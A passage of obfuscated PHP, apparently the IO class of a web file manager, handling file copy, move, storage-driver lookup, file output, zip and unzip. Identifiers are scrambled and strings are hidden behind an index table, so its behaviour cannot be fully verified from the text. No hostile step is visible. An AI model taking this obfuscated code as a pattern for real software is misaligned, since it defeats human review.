$ˆ§‘ÁÜç->pathParse[$®¿Á¦›×[1229]]; $ˆ§‘ÁÜç = self::driverMake($¼×Áß¦¯); } if ($å«Ë¯öÊ->pathParse[$®¿Á¦›×[1229]]) { $±¤ë§Ş— = $å«Ë¯öÊ->pathParse[$®¿Á¦›×[1229]]; $å«Ë¯öÊ = self::driverMake($±¤ë§Ş—); } self::check($å«Ë¯öÊ, $±¤ë§Ş—, $ˆ§‘ÁÜç, $¼×Áß¦¯); Hook::trigger($®¿Á¦›×[1230], $å«Ë¯öÊ, $±¤ë§Ş—, $ˆ§‘ÁÜç, $¼×Áß¦¯); $’›ÎĞ÷å = self::driverIsSame($å«Ë¯öÊ, $ˆ§‘ÁÜç); if ($’›ÎĞ÷å) { if ($²»£ö× == $®¿Á¦›×[620] && !method_exists($ˆ§‘ÁÜç, $®¿Á¦›×[1231]) && trim($¼×Áß¦¯, $®¿Á¦›×[8]) == trim($ˆ§‘ÁÜç->pathFather($±¤ë§Ş—), $®¿Á¦›×[8])) { if ($å«Ë¯öÊ->pathThis($±¤ë§Ş—) != $°îÕ±£ò && !$å«Ë¯öÊ->isOsDriver()) { return $å«Ë¯öÊ->rename($±¤ë§Ş—, $°îÕ±£ò); } return $ˆ§‘ÁÜç->getPathOuter($±¤ë§Ş—); } if (method_exists($ˆ§‘ÁÜç, $²»£ö×)) { return $ˆ§‘ÁÜç->{$²»£ö×}($±¤ë§Ş—, $¼×Áß¦¯, $¾­®ÄÍ, $°îÕ±£ò); } } if ($’›ÎĞ÷å && $²»£ö× == $®¿Á¦›×[620] && $ˆ§‘ÁÜç->getType() == $®¿Á¦›×[109]) { $¸®ªÁˆ± = $ˆ§‘ÁÜç->movePath($±¤ë§Ş—, $¼×Áß¦¯, $°îÕ±£ò); if ($¸®ªÁˆ±) { return $¸®ªÁˆ±; } } $ÎÓ†¿íã = $å«Ë¯öÊ->isFile($±¤ë§Ş—); if (!$ÎÓ†¿íã && $ˆ§‘ÁÜç->getType() == $®¿Á¦›×[828] && $å«Ë¯öÊ->getType() == $®¿Á¦›×[109]) { $¸®ªÁˆ± = $ˆ§‘ÁÜç->copyFolderFromIO($å«Ë¯öÊ, $±¤ë§Ş—, $¼×Áß¦¯, $¾­®ÄÍ, $ş°ôÎë§, $°îÕ±£ò); } else { $¸®ªÁˆ± = self::copyPath($å«Ë¯öÊ, $±¤ë§Ş—, $ˆ§‘ÁÜç, $¼×Áß¦¯, $¾­®ÄÍ, $ş°ôÎë§, $ÎÓ†¿íã, $°îÕ±£ò); } if ($¸®ªÁˆ± && $ş°ôÎë§) { $å«Ë¯öÊ->remove($±¤ë§Ş—); } if ($ß’…ìé„) { $¸®ªÁˆ± = $ß’…ìé„->getPathOuter($¸®ªÁˆ±); } return $¸®ªÁˆ±; } private static function check($ß¤ñ¬Ë, $š›ÃİÎ, $ÓêÜï¦¡, &$®ü›Ã†º) { $Ìí‚Õ÷÷ =& $_SERVER[¢ñàß¿€]; if (self::driverIsSame($ß¤ñ¬Ë, $ÓêÜï¦¡) && $ß¤ñ¬Ë->isFolder($š›ÃİÎ) && $ß¤ñ¬Ë->isParentOf($š›ÃİÎ, $®ü›Ã†º)) { show_json(LNG($Ìí‚Õ÷÷[1232]), !1); } if (!$ß¤ñ¬Ë->exist($š›ÃİÎ)) { show_json(LNG($Ìí‚Õ÷÷[108]), !1); } } private static function copyPath($ÌˆÁÔñ, $À¥˜¤¥ß, $‘¾ºô–, $ÜŒ´©½–, $ô´§‰š³, $Ó÷ıÖì, $ôÏ«Ó¥Æ, $Ú­Äè = false, $ëõ¥ı˜í = true) { $ë­€£Ó° =& $_SERVER[¢ñàß¿€]; $•‹£Íğ­ = empty($Ú­Äè) && $Ú­Äè !== $ë­€£Ó°[228] ? $ÌˆÁÔñ->pathThis($À¥˜¤¥ß) : $Ú­Äè; if ($ô´§‰š³) { $Ë‹¦‘ñ¬ = $‘¾ºô–->fileNameExist($ÜŒ´©½–, $•‹£Íğ­); $¯åˆ¸Ü = $•‹£Íğ­; $•‹£Íğ­ = $‘¾ºô–->fileNameAuto($ÜŒ´©½–, $•‹£Íğ­, $ô´§‰š³, !$ôÏ«Ó¥Æ); if (!$Ë‹¦‘ñ¬ || $¯åˆ¸Ü != $•‹£Íğ­) { $ô´§‰š³ = !1; } if ($ëõ¥ı˜í && !$ô´§‰š³) { $‘¾ºô–->_data[$ë­€£Ó°[1233]] = !0; } } if ($ôÏ«Ó¥Æ) { return self::copyFile($ÌˆÁÔñ, $À¥˜¤¥ß, $‘¾ºô–, $ÜŒ´©½–, $•‹£Íğ­, $Ó÷ıÖì); } if ($ô´§‰š³ == REPEAT_RENAME_FOLDER) { $ô´§‰š³ = !1; } $âø¢¡ = rtrim($ÜŒ´©½–, $ë­€£Ó°[8]) . $ë­€£Ó°[8] . $•‹£Íğ­; $˜Ä­—Ğï = $‘¾ºô–->mkdir($‘¾ºô–->getPath($âø¢¡), $ô´§‰š³); $ÜŒ´©½– = $‘¾ºô–->getPathInner($˜Ä­—Ğï); $ãœÇèÑ¹ = $ÌˆÁÔñ->listPath($À¥˜¤¥ß, !0); $ãœÇèÑ¹ = is_array($ãœÇèÑ¹) ? $ãœÇèÑ¹ : array($ë­€£Ó°[86] => array(), $ë­€£Ó°[85] => array()); $êŞ°î¦Ó = array_merge($ãœÇèÑ¹[$ë­€£Ó°[86]], $ãœÇèÑ¹[$ë­€£Ó°[85]]); foreach ($êŞ°î¦Ó as $‹ŠÚæ³) { $×Í´Óï‡ = $‹ŠÚæ³[$ë­€£Ó°[33]] == $ë­€£Ó°[230]; $À¥˜¤¥ß = $ÌˆÁÔñ->getPathInner($‹ŠÚæ³[$ë­€£Ó°[87]]); $Êùƒì¡¨ = self::copyPath($ÌˆÁÔñ, $À¥˜¤¥ß, $‘¾ºô–, $ÜŒ´©½–, $ô´§‰š³, $Ó÷ıÖì, $×Í´Óï‡, !1, !1); if (!$Êùƒì¡¨) { IO::errorTips($ë­€£Ó°[1234] . $À¥˜¤¥ß . $ë­€£Ó°[73] . $ÜŒ´©½–); } } self::copyMoveKeepInfo($ÌˆÁÔñ, $À¥˜¤¥ß, $˜Ä­—Ğï); return $˜Ä­—Ğï; } private static function copyFile($ûµÖñµ, $ıÏÁ˜µ¡, $ü¨œ÷÷ù, $³°·‘×é, $‰ÊÍ‡’, $ö¼‹åÎó) { $¥½µˆÕ =& $_SERVER[¢ñàß¿€]; $³°·‘×é = $ü¨œ÷÷ù->getPath(rtrim($³°·‘×é, $¥½µˆÕ[8]) . $¥½µˆÕ[8] . $‰ÊÍ‡’); $ë†²œª = $¥½µˆÕ[1235] . time() . rand_string(5); Hook::trigger($¥½µˆÕ[1236], $ûµÖñµ, $ıÏÁ˜µ¡, $ü¨œ÷÷ù, $³°·‘×é, $‰ÊÍ‡’, $ë†²œª); if (self::driverIsSame($ûµÖñµ, $ü¨œ÷÷ù)) { if ($ö¼‹åÎó) { $×ßÜïùÁ = $ü¨œ÷÷ù->moveFile($ıÏÁ˜µ¡, $³°·‘×é); } else { $×ßÜïùÁ = $ü¨œ÷÷ù->copyFile($ıÏÁ˜µ¡, $³°·‘×é); } Hook::trigger($¥½µˆÕ[1237], $ûµÖñµ, $ıÏÁ˜µ¡, $ü¨œ÷÷ù, $³°·‘×é, $‰ÊÍ‡’, $×ßÜïùÁ); self::copyMoveKeepInfo($ûµÖñµ, $ıÏÁ˜µ¡, $×ßÜïùÁ); return $×ßÜïùÁ; } $Ó’ƒ›œ¨ = TEMP_FILES; if ($GLOBALS[$¥½µˆÕ[6]][$¥½µˆÕ[92]][$¥½µˆÕ[867]]) { $Ó’ƒ›œ¨ = $GLOBALS[$¥½µˆÕ[6]][$¥½µˆÕ[92]][$¥½µˆÕ[867]]; } $­âö§à = $Ó’ƒ›œ¨; mk_dir($­âö§à); $ùğŠÙáß = $­âö§à . $ë†²œª; $íÚÕœ€â = $ùğŠÙáß; $ùğŠÙáß = $ûµÖñµ->download($ıÏÁ˜µ¡, $ùğŠÙáß); $ùğŠÙáß = $ûµÖñµ->iconvApp($ùğŠÙáß); if (substr($ùğŠÙáß, strlen($Ó’ƒ›œ¨)) == $Ó’ƒ›œ¨) { $ö¼‹åÎó = !0; } $×ßÜïùÁ = $ü¨œ÷÷ù->upload($³°·‘×é, $ùğŠÙáß, $ö¼‹åÎó); self::remove($íÚÕœ€â); Hook::trigger($¥½µˆÕ[1237], $ûµÖñµ, $ıÏÁ˜µ¡, $ü¨œ÷÷ù, $³°·‘×é, $‰ÊÍ‡’, $×ßÜïùÁ); self::copyMoveKeepInfo($ûµÖñµ, $ıÏÁ˜µ¡, $×ßÜïùÁ); return $×ßÜïùÁ; } private static function copyMoveKeepInfo($Ú˜ì‚®¬, $£ÍÄ™òŠ, $”Êè°’) { if (!$”Êè°’) { return; } $èš˜ûüƒ = $Ú˜ì‚®¬->info($£ÍÄ™òŠ); if (!is_array($èš˜ûüƒ)) { return; } IO::setModifyTime($”Êè°’, $èš˜ûüƒ[$_SERVER[¢ñàß¿€][88]]); } public static function pathFather($¼á‹¸×) { $ößÜµĞí = IO::init($¼á‹¸×); $‘«±ë§‹ = $ößÜµĞí->pathFather($ößÜµĞí->path); return $ößÜµĞí->getPathOuter($‘«±ë§‹); } public static function fileOut($£Â¢ä¨Ç, $Â°¸¯ê = false, $§ß …û§ = false, $˜»õ¥ÎÑ = '') { $ÌœÊ‡ ‚ = self::driverMake($£Â¢ä¨Ç); if ($ÌœÊ‡ ‚->isFileOutServer()) { return $ÌœÊ‡ ‚->fileOutServer($£Â¢ä¨Ç, $Â°¸¯ê, $§ß …û§, $˜»õ¥ÎÑ); } return $ÌœÊ‡ ‚->fileOut($£Â¢ä¨Ç, $Â°¸¯ê, $§ß …û§, $˜»õ¥ÎÑ); } public static function fileOutImage($„¡ÕËş, $íö¡×ôÁ = 250) { $¬¤‰’© = array(250, 600, 1200, 2000, 3000, 5000); for ($˜¸¸üØ = 0; $˜¸¸üØ < count($¬¤‰’©); $˜¸¸üØ++) { if ($˜¸¸üØ == 0 && $íö¡×ôÁ <= $¬¤‰’©[$˜¸¸üØ]) { $íö¡×ôÁ = $¬¤‰’©[$˜¸¸üØ]; break; } else { if ($íö¡×ôÁ > $¬¤‰’©[$˜¸¸üØ - 1] && $íö¡×ôÁ <= $¬¤‰’©[$˜¸¸üØ]) { $íö¡×ôÁ = $¬¤‰’©[$˜¸¸üØ]; break; } else { if ($˜¸¸üØ == count($¬¤‰’©) - 1 && $íö¡×ôÁ > $¬¤‰’©[$˜¸¸üØ]) { $íö¡×ôÁ = $¬¤‰’©[$˜¸¸üØ]; break; } } } } $¦æ´·ÜÌ = self::driverMake($„¡ÕËş); if ($¦æ´·ÜÌ->isFileOutServer()) { return $¦æ´·ÜÌ->fileOutImageServer($„¡ÕËş, $íö¡×ôÁ); } return $¦æ´·ÜÌ->fileOutImage($„¡ÕËş, $íö¡×ôÁ); } private static function driverIsSame($æ³¤ï¸é, $Ê¤˜­İù) { $ñèùğ³à =& $_SERVER[¢ñàß¿€]; $³ƒç§ = $æ³¤ï¸é->getType(); $®¬‹£şè = $Ê¤˜­İù->getType(); if ($³ƒç§ != $®¬‹£şè) { return !1; } if ($³ƒç§ == $ñèùğ³à[828]) { return !0; } if ($³ƒç§ == $ñèùğ³à[109]) { return !0; } if ($æ³¤ï¸é->pathDriver == $Ê¤˜­İù->pathDriver) { return !0; } return !1; } public static function copyUpdate($¦ŠÄŞñ“, $Ëà×Èß¦) { $”Á¾×õ¬ =& $_SERVER[¢ñàß¿€]; if (!IO::exist($¦ŠÄŞñ“)) { return !1; } if (!IO::exist($Ëà×Èß¦)) { IO::mkdir($Ëà×Èß¦); } $¹ßúûöÓ = array_to_keyvalue(self::listAllSimple($¦ŠÄŞñ“), $”Á¾×õ¬[87]); $×›™Û²ù = array_to_keyvalue(self::listAllSimple($Ëà×Èß¦), $”Á¾×õ¬[87]); $†´ò³ú = array(); $Ê›‡×¼« = array(); foreach ($¹ßúûöÓ as $÷Ù¢íœÛ => $ØÀëÅèà) { if (isset($×›™Û²ù[$÷Ù¢íœÛ])) { if ($ØÀëÅèà[$”Á¾×õ¬[78]] == 1) { continue; } if ($×›™Û²ù[$÷Ù¢íœÛ][$”Á¾×õ¬[79]] == $ØÀëÅèà[$”Á¾×õ¬[79]]) { continue; } } if ($ØÀëÅèà[$”Á¾×õ¬[78]] == 1) { $Ê›‡×¼«[] = $Ëà×Èß¦ . $”Á¾×õ¬[8] . trim($÷Ù¢íœÛ, $”Á¾×õ¬[8]); continue; } $üû±Â½ = strstr(trim($÷Ù¢íœÛ, $”Á¾×õ¬[8]), $”Á¾×õ¬[8]) ? get_path_father($÷Ù¢íœÛ) : $”Á¾×õ¬[12]; $†´ò³ú[] = array($”Á¾×õ¬[1238] => $ØÀëÅèà[$”Á¾×õ¬[89]], $”Á¾×õ¬[1239] => rtrim($Ëà×Èß¦, $”Á¾×õ¬[8]) . $”Á¾×õ¬[8] . $üû±Â½, $”Á¾×õ¬[1240] => $ØÀëÅèà); } $¾ª°¾Ä¨ = array($”Á¾×õ¬[230] => $†´ò³ú, $”Á¾×õ¬[78] => $Ê›‡×¼«); Hook::trigger($”Á¾×õ¬[1241], $¦ŠÄŞñ“, $Ëà×Èß¦, $¾ª°¾Ä¨); foreach ($Ê›‡×¼« as $ØÀëÅèà) { IO::mkdir($ØÀëÅèà); } foreach ($†´ò³ú as $ØÀëÅèà) { IO::copy($ØÀëÅèà[$”Á¾×õ¬[1238]], $ØÀëÅèà[$”Á¾×õ¬[1239]], REPEAT_REPLACE); } } public static function fileSubstr($Û¯öá´, $şšôÂø…, $“·ƒŸÔØ = false) { $®‘´Íæ¡ =& $_SERVER[¢ñàß¿€]; $º¨…Áç = self::driverMake($Û¯öá´); $¦«…ë„Î = $º¨…Áç->size($Û¯öá´); $Ñ´Õ©Ô” = $şšôÂø…; $ù³èÅŸ = $“·ƒŸÔØ; if ($şšôÂø… < 0) { $şšôÂø… = $¦«…ë„Î + $şšôÂø…; } if ($“·ƒŸÔØ === !1) { $“·ƒŸÔØ = $¦«…ë„Î - $şšôÂø…; } if ($şšôÂø… + $“·ƒŸÔØ > $¦«…ë„Î) { $“·ƒŸÔØ = $¦«…ë„Î - $şšôÂø…; } if (!$¦«…ë„Î && $º¨…Áç->getType() == $®‘´Íæ¡[109] && !$º¨…Áç->exist($Û¯öá´)) { $¿®óì»Ü = get_path_this($Û¯öá´); $ıéÀ­Ñ = parse_url_query($¿®óì»Ü); if (is_array($ıéÀ­Ñ) && isset($ıéÀ­Ñ[$®‘´Íæ¡[32]])) { $¿®óì»Ü = urldecode($ıéÀ­Ñ[$®‘´Íæ¡[32]]); } throw new Exception($®‘´Íæ¡[1242] . LNG($®‘´Íæ¡[1243]) . $®‘´Íæ¡[1041] . clear_html($¿®óì»Ü) . $®‘´Íæ¡[12]); } if ($“·ƒŸÔØ <= 0) { return $®‘´Íæ¡[12]; } if ($şšôÂø… < 0 || $şšôÂø… >= $¦«…ë„Î || $“·ƒŸÔØ > 1024 * 1024 * 10) { throw new Exception("\146\151\154\145\x52\x65\141\144\40\145\162\162\x6f\x72\x21\x20\x73\164\141\x72\x74\75{$şšôÂø…}\73\x6c\145\x6e\x67\x74\x68\75{$“·ƒŸÔØ}\73\40\163\x69\x7a\x65\x3d{$¦«…ë„Î}\x3b"); } $×¯°ÁÖ = $º¨…Áç->fileSubstr($Û¯öá´, $şšôÂø…, $“·ƒŸÔØ); if (!$×¯°ÁÖ && $“·ƒŸÔØ && isset($GLOBALS[$®‘´Íæ¡[1244]])) { throw new Exception($GLOBALS[$®‘´Íæ¡[1244]][$®‘´Íæ¡[1245]]); } return $×¯°ÁÖ; } private static function driverMake(&$Ûù»ª¨¶) { $Ô¥‹¨—Ş =& $_SERVER[¢ñàß¿€]; $òø‡àà— = KodIO::parse($Ûù»ª¨¶); if (!self::$driverListSystem) { $—«Àõ” = Model($Ô¥‹¨—Ş[838])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($—«Àõ”, $Ô¥‹¨—Ş[475]); } if ($òø‡àà—[$Ô¥‹¨—Ş[33]] == KodIO::KOD_IO && !self::$driverListSystem[$òø‡àà—[$Ô¥‹¨—Ş[475]]]) { throw new Exception($Ô¥‹¨—Ş[1246]); return !1; } $Ûù»ª¨¶ = $òø‡àà—[$Ô¥‹¨—Ş[1247]]; $ªÁÏƒíé = self::driverGet($òø‡àà—, $Ûù»ª¨¶); return $ªÁÏƒíé; } private static function driverGet($¹‘ã‘ıÉ, &$óáúíËï) { $²ú²ı¿ß =& $_SERVER[¢ñàß¿€]; $Æ÷ªò… = $¹‘ã‘ıÉ[$²ú²ı¿ß[1248]]; $äÉúÎè° = $¹‘ã‘ıÉ[$²ú²ı¿ß[475]]; switch ($¹‘ã‘ıÉ[$²ú²ı¿ß[33]]) { case KodIO::KOD_IO: $÷ü§Å¿ = self::$driverListSystem[$äÉúÎè°]; break; case KodIO::KOD_SOURCE: $óáúíËï = $äÉúÎè° . $óáúíËï; $÷ü§Å¿ = array($²ú²ı¿ß[1249] => $²ú²ı¿ß[1250], $²ú²ı¿ß[6] => $¹‘ã‘ıÉ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $³¤™† = $GLOBALS[$²ú²ı¿ß[1251]]; self::$driverListUser = array_to_keyvalue($³¤™†, $²ú²ı¿ß[475]); } $÷ü§Å¿ = self::$driverListUser[$äÉúÎè°]; break; case KodIO::KOD_SHARE_LINK: $÷ü§Å¿ = array($²ú²ı¿ß[1249] => $²ú²ı¿ß[1252], $²ú²ı¿ß[6] => $¹‘ã‘ıÉ); $‰±üü°Ú = Action($²ú²ı¿ß[1253])->sharePathInfo($¹‘ã‘ıÉ[$²ú²ı¿ß[87]]); $óáúíËï = $‰±üü°Ú[$²ú²ı¿ß[193]]; if (!$‰±üü°Ú[$²ú²ı¿ß[193]]) { $şÍáí…Ç = Model($²ú²ı¿ß[664])->getInfo($‰±üü°Ú[$²ú²ı¿ß[665]]); $óáúíËï = KodIO::clear($şÍáí…Ç[$²ú²ı¿ß[1254]] . $¹‘ã‘ıÉ[$²ú²ı¿ß[1247]]); $¹‘ã‘ıÉ[$²ú²ı¿ß[560]] = $şÍáí…Ç; $¹‘ã‘ıÉ[$²ú²ı¿ß[1229]] = $óáúíËï; $÷ü§Å¿ = array($²ú²ı¿ß[1249] => $²ú²ı¿ß[1255], $²ú²ı¿ß[6] => $¹‘ã‘ıÉ); } break; case KodIO::KOD_SHARE_ITEM: $÷ü§Å¿ = array($²ú²ı¿ß[1249] => $²ú²ı¿ß[1256], $²ú²ı¿ß[6] => $¹‘ã‘ıÉ); $şÍáí…Ç = Model($²ú²ı¿ß[664])->getInfo($¹‘ã‘ıÉ[$²ú²ı¿ß[475]]); if ($şÍáí…Ç[$²ú²ı¿ß[193]] == $²ú²ı¿ß[228]) { $óáúíËï = KodIO::clear($şÍáí…Ç[$²ú²ı¿ß[1254]] . $¹‘ã‘ıÉ[$²ú²ı¿ß[1247]]); $¹‘ã‘ıÉ[$²ú²ı¿ß[560]] = $şÍáí…Ç; $¹‘ã‘ıÉ[$²ú²ı¿ß[1229]] = $óáúíËï; $÷ü§Å¿ = array($²ú²ı¿ß[1249] => $²ú²ı¿ß[1257], $²ú²ı¿ß[6] => $¹‘ã‘ıÉ); } else { if (!$óáúíËï) { $óáúíËï = $şÍáí…Ç[$²ú²ı¿ß[193]]; } } break; default: $óáúíËï = $¹‘ã‘ıÉ[$²ú²ı¿ß[87]]; $÷ü§Å¿ = array($²ú²ı¿ß[1249] => $²ú²ı¿ß[1258]); break; } $†¨ŞÈß€ = $¹‘ã‘ıÉ[$²ú²ı¿ß[87]]; if (!isset(self::$driverCache[$†¨ŞÈß€])) { $Ô·³Ú‘‘ = strtolower($÷ü§Å¿[$²ú²ı¿ß[98]]); $¸¬—ÛÌæ = $GLOBALS[$²ú²ı¿ß[6]][$²ú²ı¿ß[92]][$²ú²ı¿ß[896]]; $‰ºíÁÀ© = $²ú²ı¿ß[77] . (isset($¸¬—ÛÌæ[$Ô·³Ú‘‘]) ? $¸¬—ÛÌæ[$Ô·³Ú‘‘] : ucfirst($Ô·³Ú‘‘)); if (!class_exists($‰ºíÁÀ©)) { show_json("{$‰ºíÁÀ©}\x20\156\157\164\40\x65\170\x69\x73\164\163\x21", !1); } $š§ú§Â = isset($÷ü§Å¿[$²ú²ı¿ß[6]]) ? $÷ü§Å¿[$²ú²ı¿ß[6]] : !1; self::$driverCache[$†¨ŞÈß€] = new $‰ºíÁÀ©($š§ú§Â); } $è”Ÿ££¤ = self::$driverCache[$†¨ŞÈß€]; $è”Ÿ££¤->pathDriver = $Æ÷ªò…; $è”Ÿ££¤->pathBase = $²ú²ı¿ß[12]; if (isset($÷ü§Å¿[$²ú²ı¿ß[6]][$²ú²ı¿ß[1259]])) { $è”Ÿ££¤->pathBase = rtrim($÷ü§Å¿[$²ú²ı¿ß[6]][$²ú²ı¿ß[1259]], $²ú²ı¿ß[8]) . $²ú²ı¿ß[8]; $óáúíËï = $è”Ÿ££¤->pathBase . ltrim($óáúíËï, $²ú²ı¿ß[8]); } $óáúíËï = $è”Ÿ££¤->getPath($óáúíËï); if (isset($¹‘ã‘ıÉ[$²ú²ı¿ß[1229]])) { $óáúíËï = $¹‘ã‘ıÉ[$²ú²ı¿ß[1229]]; } $è”Ÿ££¤->path = $óáúíËï; return $è”Ÿ££¤; } public static function errorTips($Ÿ¬›•…î = false) { $ıºÛñ–ò =& $_SERVER[¢ñàß¿€]; static $ã˜´“ÈÎ = array(); $—’üÂ³½ = 1000; if ($Ÿ¬›•…î === -1) { return $ã˜´“ÈÎ ? $ã˜´“ÈÎ[count($ã˜´“ÈÎ) - 1] : $ıºÛñ–ò[12]; } if ($Ÿ¬›•…î === !1) { return implode($ıºÛñ–ò[262], $ã˜´“ÈÎ); } if (count($ã˜´“ÈÎ) >= $—’üÂ³½) { $ã˜´“ÈÎ = array_slice($ã˜´“ÈÎ, $—’üÂ³½ * 0.5, $—’üÂ³½); } $ã˜´“ÈÎ[] = $Ÿ¬›•…î; write_log($ıºÛñ–ò[176] . ACTION . $ıºÛñ–ò[1260] . $Ÿ¬›•…î, $ıºÛñ–ò[1261]); } public static function getLastError($¼²õÏ ‘ = '') { $ÚÉ¦¯Ù® = self::errorTips(-1); return $ÚÉ¦¯Ù® ? $ÚÉ¦¯Ù® : $¼²õÏ ‘; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ôú—»èƒ; if ($Ôú—»èƒ) { return $Ôú—»èƒ; } $Çä¶Ä— = IO::init($_SERVER[¢ñàß¿€][8]); return $Çä¶Ä—; } private static function iconvSystem($ï×™†Í¨) { return self::local()->iconvSystem($ï×™†Í¨); } private static function iconvApp($ºùà£Ú´) { return self::local()->iconvApp($ºùà£Ú´); } public static function zipFolder($è™º’Ÿ, $“ğëì•â = "\172\x69\160", $œ —‹ôû = '', $¸¿ËìÊ = REPEAT_RENAME) { $öÜ›Ö«¦ =& $_SERVER[¢ñàß¿€]; $Ôæ‡ğâ = IO::listPath($è™º’Ÿ); if (!$Ôæ‡ğâ) { return !1; } $Ôæ‡ğâ = array_merge($Ôæ‡ğâ[$öÜ›Ö«¦[85]], $Ôæ‡ğâ[$öÜ›Ö«¦[86]]); return self::zip($Ôæ‡ğâ, $“ğëì•â, $œ —‹ôû, $¸¿ËìÊ); } public static function zip($ß˜á‰ô, $ÍÊİìæû = "\172\x69\160", $´â…ú = '', $™ÛÖªÑ€ = REPEAT_RENAME) { $ÑÁûÇÌ =& $_SERVER[¢ñàß¿€]; if (is_string($ß˜á‰ô) && $ß˜á‰ô) { $ß˜á‰ô = array(array($ÑÁûÇÌ[87] => $ß˜á‰ô)); } $í¼È•”ß = self::init($ß˜á‰ô[0][$ÑÁûÇÌ[87]]); $ª‚ºÄ”¶ = self::info($ß˜á‰ô[0][$ÑÁûÇÌ[87]]); $ë­²Ş”¶ = $ÑÁûÇÌ[12]; $¹›ùîª = $ÑÁûÇÌ[12]; $ãïÙóúö = $ÑÁûÇÌ[12]; if ($´â…ú && substr($´â…ú, -1, 1) != $ÑÁûÇÌ[8]) { $¹›ùîª = get_path_father($´â…ú); $ãïÙóúö = get_path_this($´â…ú); } else { $¹›ùîª = self::pathFather($ª‚ºÄ”¶[$ÑÁûÇÌ[87]]); $ãïÙóúö = $ª‚ºÄ”¶[$ÑÁûÇÌ[32]] . $ÑÁûÇÌ[10] . $ÍÊİìæû; if (count($ß˜á‰ô) > 1) { $÷û·¿´ø = IO::info($¹›ùîª); $ãïÙóúö = $÷û·¿´ø[$ÑÁûÇÌ[32]] . $ÑÁûÇÌ[10] . $ÍÊİìæû; } if ($´â…ú) { $¹›ùîª = $´â…ú; } } if ($í¼È•”ß->getType() == $ÑÁûÇÌ[109]) { $ÈÈÖŒ„ = self::init($¹›ùîª); $¡º–ò­î = $ÈÈÖŒ„->getType() == $ÑÁûÇÌ[109] ? $¹›ùîª : get_path_father($í¼È•”ß->path); $¡º–ò­î = rtrim($¡º–ò­î, $ÑÁûÇÌ[8]) . $ÑÁûÇÌ[8]; mk_dir($¡º–ò­î); } else { $ë­²Ş”¶ = TEMP_FILES . $ÑÁûÇÌ[1262] . time() . rand_string(8) . $ÑÁûÇÌ[8]; mk_dir($ë­²Ş”¶); file_put_contents($ë­²Ş”¶ . $ÑÁûÇÌ[1263], $ÑÁûÇÌ[12]); $¡º–ò­î = $ë­²Ş”¶; } $•‚úïŠ„ = IO::info($¡º–ò­î); if (!$•‚úïŠ„ || !$•‚úïŠ„[$ÑÁûÇÌ[233]]) { show_json(LNG($ÑÁûÇÌ[1264]), !1); } $¢í™Ø¶£ = self::zipFileList($ß˜á‰ô, $ë­²Ş”¶); foreach ($¢í™Ø¶£ as $ÒËïñÎ => $”ûå•ôÙ) { $¢í™Ø¶£[$ÒËïñÎ] = self::iconvSystem($”ûå•ôÙ); } $™Ú¾†Æ = get_filename_auto($¡º–ò­î . $ãïÙóúö, $ÑÁûÇÌ[12], $™ÛÖªÑ€); KodArchive::create(self::iconvSystem($™Ú¾†Æ), $¢í™Ø¶£); if (!IO::exist($™Ú¾†Æ)) { if ($ë­²Ş”¶) { del_dir($ë­²Ş”¶); } write_log($ÑÁûÇÌ[1265] . $™Ú¾†Æ, $ÑÁûÇÌ[389]); show_json(LNG($ÑÁûÇÌ[1266]), !1); } if (!$ë­²Ş”¶) { return $™Ú¾†Æ; } $Î–—÷´» = self::move($™Ú¾†Æ, $¹›ùîª, $™ÛÖªÑ€); if ($ë­²Ş”¶) { del_dir($ë­²Ş”¶); } if (!$™Ú¾†Æ) { write_log($ÑÁûÇÌ[1267] . $™Ú¾†Æ . $ÑÁûÇÌ[1268] . $¹›ùîª, $ÑÁûÇÌ[389]); show_json(LNG($ÑÁûÇÌ[1266]), !1); } return $Î–—÷´»; } public static function unzip($ü™¨Øşí, $óÃéøÆ¸, $äş¢Ã° = "\x2d\x31", $”£šÒ’İ = "\162\145\160\154\141\143\x65") { $áŞİ…±Ü =& $_SERVER[¢ñàß¿€]; $óÒÏ‘Ãı = parent::info($ü™¨Øşí); if (!$óÒÏ‘Ãı) { show_json(LNG($áŞİ…±Ü[1269]), !1); } $Ç”´øµ = IO::infoFullSimple($óÃéøÆ¸); if (!$Ç”´øµ) { $óÃéøÆ¸ = IO::mkdir($óÃéøÆ¸); } if (isset($Ç”´øµ[$áŞİ…±Ü[193]]) && trim($Ç”´øµ[$áŞİ…±Ü[87]], $áŞİ…±Ü[8]) != trim($óÃéøÆ¸, $áŞİ…±Ü[8])) { $õçÁ  = KodIO::make($Ç”´øµ[$áŞİ…±Ü[192]]); $¡—˜›Ç = IO::fileNameAuto($õçÁ , $Ç”´øµ[$áŞİ…±Ü[32]], REPEAT_RENAME_FOLDER, !0); $óÃéøÆ¸ = IO::mkdir($õçÁ  . $¡—˜›Ç); } $äş¢Ã° = $äş¢Ã° && $äş¢Ã° != $áŞİ…±Ü[1270] ? @json_decode($äş¢Ã°, !0) : -1; $éàÁûİ  = self::unzipPart($ü™¨Øşí, $äş¢Ã°); if (!$éàÁûİ  || !IO::exist($éàÁûİ [$áŞİ…±Ü[230]])) { show_json(LNG($áŞİ…±Ü[108]), !1); } $èà×ºŞÈ = $éàÁûİ [$áŞİ…±Ü[1271]][count($éàÁûİ [$áŞİ…±Ü[1271]]) - 1]; if ($èà×ºŞÈ[$áŞİ…±Ü[1272]] == -1 || substr($èà×ºŞÈ[$áŞİ…±Ü[32]], -1, 1) == $áŞİ…±Ü[8]) { $íŸıàºÚ = $éàÁûİ [$áŞİ…±Ü[1273]] . rand_string(10) . $áŞİ…±Ü[8]; mk_dir($íŸıàºÚ); $šÎ±Ï£à = count($éàÁûİ [$áŞİ…±Ü[1271]]) == 1 ? IO::ext($ü™¨Øşí) : get_path_ext($éàÁûİ [$áŞİ…±Ü[230]]); $‹§®±¹€ = KodArchive::extract(self::iconvSystem($éàÁûİ [$áŞİ…±Ü[230]]), $íŸıàºÚ, $èà×ºŞÈ[$áŞİ…±Ü[1272]], $¡—˜›Ç, $šÎ±Ï£à); self::unzipErrorCheck($‹§®±¹€, array($áŞİ…±Ü[1274], $ü™¨Øşí, $šÎ±Ï£à, $óÃéøÆ¸, $éàÁûİ )); Hook::trigger($áŞİ…±Ü[1275], $íŸıàºÚ); recursion_dir($íŸıàºÚ, $Úâ´¶²², $²¶ùÑç¤, 0); $şö†ı¶‘ = array_merge($Úâ´¶²², $²¶ùÑç¤); $ ¯œâÖ = array(); foreach ($şö†ı¶‘ as $ˆœ›Èì©) { $ÂÁœşƒï = IO::move(self::iconvApp($ˆœ›Èì©), 